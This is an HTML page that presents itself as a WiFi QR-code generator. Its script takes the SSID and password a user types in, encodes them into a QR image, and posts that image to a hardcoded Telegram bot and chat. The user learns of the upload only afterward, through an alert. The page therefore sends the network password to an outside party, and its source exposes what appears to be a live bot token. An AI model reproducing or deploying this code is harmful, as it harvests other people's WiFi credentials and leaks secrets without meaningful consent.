<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect to WiFi</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
</head>

<body>
    <div class="container">
        <h2>Connect to WiFi</h2>
        <div class="form-group">
            <label for="ssid">SSID:</label>
            <input type="text" id="ssid" name="ssid" required>
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
        </div>
        <div class="form-group">
            <button onclick="submitForm()">Generate QR Code</button>
        </div>
        <div id="qrcode"></div>
    </div>

    <script>
        async function submitForm() {
            const ssid = document.getElementById('ssid').value;
            const password = document.getElementById('password').value;

            // Generate the WiFi QR code
            const qrCodeData = `WIFI:T:WPA;S:${ssid};P:${password};;`;
            const qrCodeContainer = document.getElementById('qrcode');
            qrCodeContainer.innerHTML = ""; // Clear previous QR code
            const qrCode = new QRCode(qrCodeContainer, {
                text: qrCodeData,
                width: 256,
                height: 256,
                correctLevel: QRCode.CorrectLevel.H
            });

            // Wait for QR code to be generated
            setTimeout(async () => {
                const qrCanvas = qrCodeContainer.querySelector('canvas');
                if (qrCanvas) {
                    // Create an off-screen canvas to draw the final image with border and date/time
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    const padding = 20;
                    const dateTimeHeight = 30;
                    const qrSize = qrCanvas.width;

                    // Set canvas dimensions
                    canvas.width = qrSize + 2 * padding;
                    canvas.height = qrSize + 2 * padding + dateTimeHeight;

                    // Draw white background
                    context.fillStyle = 'white';
                    context.fillRect(0, 0, canvas.width, canvas.height);

                    // Draw QR code on the canvas with padding
                    context.drawImage(qrCanvas, padding, padding);

                    // Add date and time below the QR code
                    const dateTime = new Date().toLocaleString();
                    context.fillStyle = 'black';
                    context.font = '16px Arial';
                    context.textAlign = 'center';
                    context.fillText(dateTime, canvas.width / 2, canvas.height - 10);

                    // Get the final image as data URL
                    const finalImage = canvas.toDataURL('image/png');

                    // Send the QR code image to Telegram bot
                    const telegramBotToken = '7485708002:AAEy-gCr1lG9ZX6AXxpJdbo6GjA6xtJ5L5U';
                    const chatId = 6957049018; // Replace with your personal chat ID
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', dataURLToBlob(finalImage), 'wifi_qr_code.png');

                    try {
                        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });

                        const result = await response.json();
                        if (result.ok) {
                            alert('QR code sent to Telegram bot successfully!');
                        } else {
                            console.error('Error response from Telegram:', result);
                            alert('Failed to send QR code to Telegram bot. Check console for details.');
                        }
                    } catch (error) {
                        console.error('Network error or other issue:', error);
                        alert('Network error. Failed to send QR code to Telegram bot.');
                    }
                } else {
                    console.error('QR code canvas not found.');
                    alert('Failed to generate QR code. Try again.');
                }
            }, 500); // Delay to ensure QR code is rendered

            // Notify the user
            alert('Scan the QR code with your phone to connect to the WiFi network.');
        }

        // Utility function to convert data URL to Blob
        function dataURLToBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }
    </script>
</body>

</html>